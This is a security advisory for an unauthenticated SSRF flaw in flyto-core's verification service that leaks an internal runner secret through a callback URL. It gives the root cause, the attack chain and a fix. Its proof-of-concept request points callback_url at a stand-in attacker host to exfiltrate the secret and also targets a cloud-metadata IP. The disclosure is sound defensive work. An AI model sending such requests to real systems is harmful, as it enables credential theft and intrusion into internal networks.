# [C] Flyto2 Core: Unauthenticated flyto-verification /run: callback_url SSRF and internal runner-secret exfiltration

## Summary
Severity: Critical
Advisory: GHSA-jx74-cqjv-2c67
CVE: CVE-2026-67426
CWE: CWE-306, CWE-522, CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-07-30
Source: https://github.com/advisories/GHSA-jx74-cqjv-2c67
Type: github-advisory

## Affected
- PyPI: `flyto-core` — affected >=2.26.6 <2.26.7

## Details
## Summary
The standalone `flyto-verification` service exposes `POST /run` with **no authentication**, on all interfaces (0.0.0.0:8344 per the shipped Dockerfile). The request body's `callback_url` is used verbatim for an outbound POST that **unconditionally attaches `X-Internal-Key: $FLYTO_RUNNER_SECRET`**. The `callback_url` bypasses the service's `target_allowed` allowlist (which only inspects `params.target_url`) and is never passed through any SSRF guard. This yields (a) unauthenticated SSRF to internal/metadata endpoints with an attacker-controlled JSON body, and (b) exfiltration of the internal runner secret to an attacker-controlled host — allowing forged authenticated callbacks to the real engine.

## Root Cause
- `src/core/verification_service.py:363-364` — `/run` has no `Depends`/auth dependency.
- `resolve_callback_url` returns the client `callback_url` verbatim (`:315-316`).
- `post_callback` attaches `X-Internal-Key: $FLYTO_RUNNER_SECRET` whenever the env var is set (`:327-335`).
- `target_allowed` only gates `params.target_url` (`:259`), never `callback_url`. No `validate_url_*` anywhere in the file.
- `Dockerfile.verification` CMD = `main('0.0.0.0', 8344)`; entrypoint `flyto-verification` in `pyproject.toml:107` → the shipped image binds all interfaces by default.

## Impact
Unauthenticated (PR:N) readable SSRF to internal/cloud-metadata with a controlled body (C:H, S:C), plus theft of `FLYTO_RUNNER_SECRET` to an attacker host → the attacker can then authenticate to the real engine callback endpoint (credential compromise, CWE-522).

## Proof of Concept
Code-proven this session (all lines confirmed on v2.26.6):
```
POST http://<verification-host>:8344/run
{"workflowYaml":"...","params":{...},"callback_url":"http://attacker.tld/collect"}
# -> service POSTs to attacker.tld with header X-Internal-Key: <FLYTO_RUNNER_SECRET>
# Or callback_url=http://<cloud-metadata-ip>/... for internal SSRF with a controlled body.
```

## Attack Chain
1. Entry: unauthenticated `POST http://<host>:8344/run` with `callback_url:"http://attacker.tld/collect"`. Guard: auth on `/run`. Bypass proof: no `Depends(require_auth)` (verification_service.py:363-364); Dockerfile binds all interfaces on port 8344.
2. Check: `target_allowed` scope (:259). Bypass proof: only inspects `params.target_url`; `callback_url` is never passed through `extract_host`/`target_allowed`.
3. Check: SSRF validation on `callback_url`. Bypass proof: file has ZERO `validate_url` references.
4. Sink: `post_callback` → `session.post(callback_url, json=payload, headers={"X-Internal-Key": FLYTO_RUNNER_SECRET})` (:330-335); header attached unconditionally when the env var is set (:327-329).
5. Impact: (a) SSRF to the cloud metadata IP / internal with a controlled JSON body; (b) exfiltration of FLYTO_RUNNER_SECRET → replay to authenticate to the real engine callback endpoint.

## Bypass Evidence
`/run` has no auth dependency (grep-confirmed); `resolve_callback_url` returns the client value verbatim; `X-Internal-Key` attached unconditionally; `target_allowed` gates only `params.target_url`; no `validate_url_*` in the file; shipped Dockerfile binds all interfaces.

## Affected Versions
`<= 2.26.6` — `verification_service.py`, `pyproject.toml:107` entrypoint, and `Dockerfile.verification` present on latest release tag.

## Suggested Fix
Add authentication to `/run`; run `callback_url` through the SSRF guard + host allowlist before attaching any internal header; do not attach `X-Internal-Key` to non-allowlisted destinations; bind the service to loopback by default.

## Credit

Vulnerability discovered by zx (Jace).

## References
- https://github.com/flytohub/flyto-core/security/advisories/GHSA-jx74-cqjv-2c67
- https://nvd.nist.gov/vuln/detail/CVE-2026-67426
- https://github.com/flytohub/flyto-core/commit/0a0a528520ec18f5a21f1ddf858a71cc1edfb6e9
- https://github.com/flytohub/flyto-core
- https://github.com/flytohub/flyto-core/releases/tag/v2.26.7
- https://github.com/pypa/advisory-database/tree/main/vulns/flyto-core/PYSEC-2026-3571.yaml
